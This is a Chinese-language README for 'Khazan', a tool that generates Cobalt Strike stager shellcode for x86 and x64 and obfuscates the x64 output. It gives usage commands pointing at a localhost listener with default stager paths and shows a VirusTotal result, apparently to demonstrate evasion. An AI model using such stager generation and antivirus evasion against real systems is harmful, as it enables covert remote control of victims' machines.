# Khazan

## 1. 简介

一个 CS shellcode 生成器，用于生成适配 CS 的 shellcode，小玩具。

## 2. 主要功能

【*】支持 http 协议的 shellcode

【*】支持 x64/x86种架构

【*】x64 架构下会对 shellcode 进行混淆

## 3. 使用说明

参数：

```
-a string
	选择生成 shellcode 的架构（x86/x64）
-u string
	指定监听的 url
```

生成 64位 shellcode：

```
Khazan.exe -a x64 -u http://127.0.0.1/FMsW
	/FMsW 为CS默认的64位stager请求路径，如果使用profile文件需要修改该路径
```

生成 32位 shellcode：

```
Khazan.exe -a x86 -u http://127.0.0.1/yn4A
	/yn4A 为CS默认的32位stager请求路径，如果使用profile文件需要修改该路径
```

## 4. VT

64 位 shellcode：
![](https://user-images.githubusercontent.com/84751437/229712692-074d5857-049f-4f0d-804e-db55c684222e.png)



